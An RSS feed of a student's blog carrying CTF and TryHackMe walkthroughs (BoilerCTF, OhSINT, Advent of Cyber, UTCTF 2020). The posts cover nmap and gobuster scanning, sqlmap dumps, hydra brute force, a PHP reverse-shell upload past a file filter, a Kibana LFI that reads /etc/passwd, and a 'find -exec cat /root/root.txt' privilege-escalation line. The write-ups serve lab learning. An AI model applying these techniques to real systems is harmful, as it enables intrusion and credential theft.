<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>Naughtyb0y's Blog</title>
        <description>This blog is maintained by a student of IIT(ISM) Dhanbad</description>
        <link>http://localhost:8000/</link>
        <atom:link href="http://localhost:8000/feed.xml" rel="self" type="application/rss+xml"/>
        <pubDate>Fri, 13 Mar 2020 01:28:27 +0530</pubDate>
        <lastBuildDate>Fri, 13 Mar 2020 01:28:27 +0530</lastBuildDate>
        <generator>Jekyll v4.0.0</generator>
        
            <item>
                <title>Try Hackme BoilerCTF Walkthrough</title>
                <description>&lt;!--more--&gt;
&lt;p&gt;So I am back with another writup
this is the &lt;a href=&quot;https://tryhackme.com/room/boilerctf2&quot;&gt;link&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;I started with a quick scan with nmap and got this
&lt;img src=&quot;images/thm_boilerctf/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The ports open are &lt;strong&gt;21,80,10000&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;So we checkout the http page on port 80&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/thm_boilerctf/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;It doesn’t contain anything useful lets check port 10000
it uses ssl so make sure to use &lt;strong&gt;https:&lt;/strong&gt; instead of &lt;strong&gt;http:&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/thm_boilerctf/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I searched for vulnerability related to this Webmin version But I didn’t find anthing useful so 
there is a question related to finding the service on the highest port so I ran a quick scan(it still took 10 mins) for the higher ports and found a port open&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/thm_boilerctf/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;On looking deeper into the port I find that ssh is running at this port so 
we have to find ssh creds&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/thm_boilerctf/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I forgot to look at ftp port so lets see if anonymous login is possible&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/thm_boilerctf/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;yes and we find a file lets read it ,It look like a caesar cipher using an online tool I got the message&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/thm_boilerctf/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Very encouraging words in the message ,at this time I had no clue how to get the login creds so I ran the gobuster for hidden directories&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/thm_boilerctf/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;So the server is using  &lt;strong&gt;Joomla&lt;/strong&gt; CMS
Again running gobuster on the joomla directory&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/thm_boilerctf/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Visiting some of the pages its some cipher its just there to troll me 
I was frustated to see the message I got after visiting some of the pages 
so I didn’t share the message in them&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/thm_boilerctf/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/thm_boilerctf/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/thm_boilerctf/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;On checking &lt;em&gt;_test&lt;/em&gt; i got the following page&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/thm_boilerctf/13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;searching for vulnerablity related to it I got &lt;a href=&quot;https://www.exploit-db.com/exploits/47204&quot;&gt;this&lt;/a&gt;
So it seems that there is RCE in the url so lets see the log file if we can&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/thm_boilerctf/14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;So we find some creds&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;basterd:superduperp@$$&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;lets login !!&lt;/p&gt;

&lt;p&gt;We can find the pass word for stoner&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/thm_boilerctf/15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;lets see what is there in stoner’s home directory
there is the user.txt flag for us but its name in the machine is secret&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/thm_boilerctf/16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;lets find the location of root.txt
we find the location at /root/root.txt&lt;/p&gt;

&lt;p&gt;lets try if we can exploit find first 
and we can so we use the following command to get the flag
&lt;code class=&quot;highlighter-rouge&quot;&gt;find / -exec cat /root/root.txt \;&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;you will have to stop the command or it will continue till the infinity&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/thm_boilerctf/17.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;So this is the final flag
Hope you learnt something! &lt;strong&gt;:)&lt;/strong&gt;&lt;/p&gt;
</description>
                <pubDate>Thu, 12 Mar 2020 00:00:00 +0530</pubDate>
                <link>http://localhost:8000/Try-Hack-Me-BoilerCTF-Walkthrough</link>
                <guid isPermaLink="true">http://localhost:8000/Try-Hack-Me-BoilerCTF-Walkthrough</guid>
                
                <category>TryHackMe</category>
                
                
            </item>
        
            <item>
                <title>Try Hackme OhSINT Walkthrough</title>
                <description>&lt;!--more--&gt;
&lt;p&gt;this is the writup for the &lt;a href=&quot;https://tryhackme.com/room/ohsint&quot;&gt;room&lt;/a&gt; on try hackme&lt;/p&gt;

&lt;p&gt;lets start !!
we are given with an image&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/thm_oshint/WindowsXP.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;lets see what exiftool gives us&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/thm_oshint/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;So we got a username - &lt;strong&gt;OWoodflint&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;lets search for it using sherlock.py and we got that there is a twitter account with this username&lt;/p&gt;

&lt;p&gt;lets search google with this username&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/thm_oshint/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;so there is a Wordpress blog as well lets checkout the twitter account first&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/thm_oshint/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;we get the answer to first question&lt;/p&gt;

&lt;p&gt;there is also a bssid mention by him in a tweet lets geolocate it
I found that &lt;a href=&quot;wigle.net&quot;&gt;this&lt;/a&gt; is useful&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/thm_oshint/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;So we find that our target lives in London&lt;/p&gt;

&lt;p&gt;On infitely zooming in I find the ssid
its &lt;strong&gt;UnileverWifi&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/thm_oshint/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;after a lot of digging I could not find the email so I though of checking github as there might be some repo with the username and yes I got the email&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/thm_oshint/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;for the 6th question its straight forward we can get it by looking at his blog&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/thm_oshint/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;for the last question we had to find the password of the person so I searched his twitter account but got nothing so I looked deep into his blog and got the password in the source code&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/thm_oshint/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;and yup another room solved I found this quiet easy as it was basic recon but practice is always good :)&lt;/p&gt;

</description>
                <pubDate>Wed, 11 Mar 2020 00:00:00 +0530</pubDate>
                <link>http://localhost:8000/Try-Hack-Me-OhSINT</link>
                <guid isPermaLink="true">http://localhost:8000/Try-Hack-Me-OhSINT</guid>
                
                <category>TryHackMe</category>
                
                <category>OSINT</category>
                
                
            </item>
        
            <item>
                <title>Try Hackme Advent of Cyber Day19 to Day24 Walkthrough</title>
                <description>&lt;!--more--&gt;
&lt;p&gt;So this is last part of the writup of the 25-day series
Hope you learnt something till now!!!&lt;/p&gt;

&lt;h2 id=&quot;day19task-24&quot;&gt;Day19(Task 24)&lt;/h2&gt;

&lt;p&gt;this is a LFI task 
just like we have done in previous task 
so I ran the whoami command and got the response shown below&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/thm_advent/82.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;So we are root so lets find where the user.txt file is located note that we have to url encode the command we are going to execute so I used the find command to find the location&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/thm_advent/80.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;now just simply reading out the user.txt file 
I know that the task was to spawn a revershell using the lfi but I was lazy enough to not do that and find the other way&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/thm_advent/81.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;day20task-25&quot;&gt;Day20(Task 25)&lt;/h2&gt;

&lt;p&gt;We are given with an IP let’s start with the basic nmap scan&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/thm_advent/83.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;we got the answer to the first question now lets use hydra to bruteforce the user &lt;strong&gt;sam&lt;/strong&gt; password&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/thm_advent/84.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;found the password now logging into the machine using ssh and reading the first flag&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/thm_advent/85.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;the second part was a cronjob escalation which is kind of easy if you understood the previous challenges carefully&lt;/p&gt;

&lt;p&gt;so I am not solving the last part&lt;/p&gt;

&lt;h2 id=&quot;day21task-26&quot;&gt;Day21(Task 26)&lt;/h2&gt;

&lt;p&gt;This is a reversing engineering task 
I am complete noob in this fields so I read about tons of blogs to get started on this
lets begin with analysing the binary with r2 using following command&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;r2 -d &amp;lt;file-name&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;now we start auto-analysing the binary with the command &lt;strong&gt;&lt;em&gt;aaaa&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Now search for the main function as referred in the helping material using&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;afl |grep &quot;main&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;images/thm_advent/86.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;now to view the disassembled assembly code for main function we use
&lt;code class=&quot;highlighter-rouge&quot;&gt;pdf @main&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/thm_advent/87.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;here we can see the disassembled code and I don’t need to explain you in detail all of the things are given in helping material&lt;/p&gt;

&lt;p&gt;now lets add breakpoints  by using following commands&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;db &amp;lt;address&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;to add a breakpoint&lt;/p&gt;

&lt;p&gt;then we use the commands to control the execution flow
&lt;strong&gt;dc&lt;/strong&gt;- continue exection 
&lt;strong&gt;ds&lt;/strong&gt;- go one step ahead into the program flow&lt;/p&gt;

&lt;p&gt;you can see the breakpoints i added&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/thm_advent/88.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;now checking the value of var_ch at intialization
we see that the value of var_ch is still not initialised so we step one instruction further and view its value by using &lt;code class=&quot;highlighter-rouge&quot;&gt;px @&amp;lt;location&amp;gt;&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/thm_advent/89.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We got the answer to first question now continuing
now we have to check the values of the register so we use &lt;code class=&quot;highlighter-rouge&quot;&gt;dr&lt;/code&gt; command&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/thm_advent/90.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We got the answer to the second question as well so lets continue
now we to check the value of &lt;em&gt;var_4h&lt;/em&gt; before the eax register has 0 assigned to it&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/thm_advent/91.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;we get the answer to the third question as well 
That’s all for this task&lt;/p&gt;

&lt;h2 id=&quot;day22task-27&quot;&gt;Day22(Task 27)&lt;/h2&gt;

&lt;p&gt;This is also a reversing task but this is used to explain the implementation of the conditional statements in the assembly code&lt;/p&gt;

&lt;p&gt;lets view the decompiled code of the main function&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/thm_advent/92.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;the C language equivalent code would be something like this&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;
&lt;span class=&quot;nf&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;from the above code we can easily answer the questions asked in the task&lt;/p&gt;

&lt;h2 id=&quot;day23task-28&quot;&gt;Day23(Task 28)&lt;/h2&gt;

&lt;p&gt;So this a SQL-injection task
And I have previously used the sqlmap tool in previous task so I dont need to explain it again&lt;/p&gt;

&lt;p&gt;lets take al look at the website,just a basic login form&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/thm_advent/93.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;lets start up burp and capture the request to be supplied to splmap
and check for the databases present with sqlmap&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/thm_advent/94.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;so the database name is &lt;strong&gt;social&lt;/strong&gt; and lets check for tables&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/thm_advent/95.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;so looks like the table is &lt;strong&gt;users&lt;/strong&gt; so lets dump the data present in the table&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/thm_advent/96.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;so we got the email for santa claus ie &lt;strong&gt;bigman@shefesh.com&lt;/strong&gt;and the password as md5 hash so lets crack it online&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/thm_advent/97.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;lets login into the website
we can easily view the conversation between santa and Mommy Mistletoe&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/thm_advent/98.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;to get a shell we have to upload php revshell to the site 
so we can post the php file to website but we cant upload it directly as it restricts it so we rename the file as .phtml and it lets us upload it and simultaneously start a listner at the port specified in the file&lt;/p&gt;

&lt;p&gt;so we get a shell and access the flag&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/thm_advent/99.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;day24task-29&quot;&gt;Day24(Task 29)&lt;/h2&gt;

&lt;p&gt;lets start with an nmap scan&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/thm_advent/100.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;so lets checkout the 9200 port elastiseach service 
i got a useful &lt;a href=&quot;https://logz.io/blog/elasticsearch-queries/&quot;&gt;article&lt;/a&gt; on same&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/thm_advent/101.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;lets checkout the port 8000
its turns out to be a logfile so lets take a look at it&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/thm_advent/102.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;so it seems that there seems to be a server running at 5601
so lets verify it with nmap and it seems to be true&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/thm_advent/103.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;lets visit the port&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/thm_advent/104.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;lets search for the kibana version number&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/thm_advent/105.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;On search about vulnerablities related to this version i found &lt;a href=&quot;https://www.cvedetails.com/cve/CVE-2018-17246/&quot;&gt;this&lt;/a&gt; and also &lt;a href=&quot;https://www.cyberark.com/threat-research-blog/execute-this-i-know-you-have-it/&quot;&gt;this&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;lets try it&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/thm_advent/106.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;we can see the contents of /etc/passwd in the log file&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/thm_advent/107.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;so lets try to view the root.txt file&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/thm_advent/108.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Hurray we got the flag lets submit it and I completed the 25 day series
This series was very interesting and got to learn a lot&lt;/p&gt;

&lt;p&gt;Day 25 has &lt;strong&gt;no task&lt;/strong&gt; so this ends the writup&lt;/p&gt;

</description>
                <pubDate>Tue, 10 Mar 2020 00:00:00 +0530</pubDate>
                <link>http://localhost:8000/Try-Hack-Me-Advent-Of-Cyber-Day19_to_Day24</link>
                <guid isPermaLink="true">http://localhost:8000/Try-Hack-Me-Advent-Of-Cyber-Day19_to_Day24</guid>
                
                <category>TryHackMe</category>
                
                <category>Advent_Of_Cyber</category>
                
                
            </item>
        
            <item>
                <title>UTCTF 2020 Writup</title>
                <description>&lt;!--more--&gt;
&lt;h2 id=&quot;observe-closelyforensics50-pts&quot;&gt;Observe Closely(Forensics),50 pts&lt;/h2&gt;

&lt;p&gt;Running strings on the binary shows us a hidden_binary at the end of the png file 
lets run binwalk 
&lt;img src=&quot;images/utctf20/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;we can confirm that there is indeed a binary hidden inside the file lets extract and run it 
&lt;img src=&quot;images/utctf20/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;we got the flag!!&lt;/p&gt;

&lt;h2 id=&quot;1-frame-per-minuteforensics50-pts&quot;&gt;1 Frame per Minute(Forensics),50 pts&lt;/h2&gt;

&lt;p&gt;As the SSTV was mentioned in the challenge description 
It was similar to the &lt;em&gt;moonwalk&lt;/em&gt; challenges in the picoCTF&lt;/p&gt;

&lt;p&gt;I used this mobile &lt;a href=&quot;https://play.google.com/store/apps/details?id=xdsopl.robot36&amp;amp;hl=en_IN&quot;&gt;app&lt;/a&gt; in auto-detect mode and let the audio play and I got the flag&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/utctf20/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;basicsforensics50-pts&quot;&gt;[basics]Forensics,50 pts&lt;/h2&gt;

&lt;p&gt;we just check the file type of the file give and it just turns out to be text so we grep for our flag and get the flag&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/utctf20/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;spectreforensics50-pts&quot;&gt;spectre(Forensics),50 pts&lt;/h2&gt;

&lt;p&gt;As the name gave the hint ,this must the challenge in which the flag is hidden in the spectrogram of the audio file&lt;/p&gt;

&lt;p&gt;firing up Sonic-Visualiser and plotting spectrogram gives us the flag
&lt;img src=&quot;images/utctf20/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;epic-admin-pwnweb-50-pts&quot;&gt;epic admin pwn(Web), 50 pts&lt;/h2&gt;

&lt;p&gt;we are provided with the following login website vulnerable to SQLi&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/utctf20/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;lets intercept the request with burp and use it with burp&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/utctf20/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;now using sqlmap gets us the pass&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/utctf20/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;the-legend-of-hackerman-pt-1forensics50-pts&quot;&gt;The Legend of Hackerman Pt. 1(Forensics),50 pts&lt;/h2&gt;

&lt;p&gt;so the png file is corrupted so lets compare the corrupted png with another png file
we see that there is error in magic bytes so lets correct it&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/utctf20/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/utctf20/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;now we can easily view the image&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/utctf20/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

</description>
                <pubDate>Mon, 09 Mar 2020 00:00:00 +0530</pubDate>
                <link>http://localhost:8000/UTCTF20-Writup</link>
                <guid isPermaLink="true">http://localhost:8000/UTCTF20-Writup</guid>
                
                <category>CTF</category>
                
                <category>Forensics</category>
                
                <category>Web</category>
                
                
            </item>
        
            <item>
                <title>Try Hackme Advent of Cyber Day13 to Day18 Walkthrough</title>
                <description>&lt;!--more--&gt;
&lt;p&gt;So this is third part to the Advent_of_Cyber 25 part Series on &lt;a href=&quot;https://tryhackme.com&quot;&gt;https://tryhackme.com&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&quot;day13task-18&quot;&gt;Day13(Task 18)&lt;/h2&gt;
&lt;p&gt;I started my day today with one of the most frustrating machines to root ,it was this machine
Starting with a nmap scan as usual&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/thm_advent/50.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;we see ports 80(http),3389(rdp) open and found about the services by selective scans
Checking out the http page,nothing interesting&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/thm_advent/51.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;running gobuster for hidden directory search ,found a hidden directory &lt;strong&gt;retro&lt;/strong&gt; which turns out to be a blog&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/thm_advent/52.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;checking out the comment by &lt;strong&gt;wade&lt;/strong&gt;,i thought that maybe  this is one of the users and got the password as &lt;strong&gt;parzival&lt;/strong&gt;
as metioned in the comment&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/thm_advent/53.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;logging into wordpress dashboard doesn’t give us anything useful either&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/thm_advent/54.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;now using &lt;strong&gt;Remmina&lt;/strong&gt; for rdp connection instead of default as it hash gui and easy to use 
got the user.txt file on the desktop itself which is one of the flag&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/thm_advent/56.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;now on open chrome i got a bookmark refering to a particular vulnerablitiy leading to priv esc in windows server 16
i found a &lt;a href=&quot;https://github.com/jas502n/CVE-2019-1388/blob/master/CVE-2019-1388.gif&quot;&gt;gif&lt;/a&gt; related to this&lt;/p&gt;

&lt;p&gt;so i start with making the internet explorer the default application as  I saw in the gif&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/thm_advent/55.png&quot; alt=&quot;&quot; /&gt;
I could also see the link to the certificate on hovering around the link&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/thm_advent/57.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;on chossing internet explorer it showed that this page can’t be displayed
so lets save it ,just following the gif&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/thm_advent/59.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;using the name field to navigate to &lt;strong&gt;cmd.exe&lt;/strong&gt; file in system32 folder&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/thm_advent/63.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/thm_advent/58.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/thm_advent/60.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;finally got the command prompt and on checking the user it was the administrator so lets read the root flag&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/thm_advent/61.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;got the flag in the desktop folder of the admin&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/thm_advent/62.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This was literally one of the toughest one in the series till now as it used knowledge from the previous task as well&lt;/p&gt;

&lt;h2 id=&quot;day14task-19&quot;&gt;Day14(Task 19)&lt;/h2&gt;
&lt;p&gt;it was just a basics amazon aws bucket access task&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/thm_advent/64.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/thm_advent/65.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I don’t even need to explain it :)&lt;/p&gt;

&lt;h2 id=&quot;day15task-20&quot;&gt;Day15(Task 20)&lt;/h2&gt;
&lt;p&gt;we have are given a box so lets start with the nmap scan first as always&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/thm_advent/66.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Lets checkout the webpage get the answer to the first question here itself&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;images/thm_advent/67.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

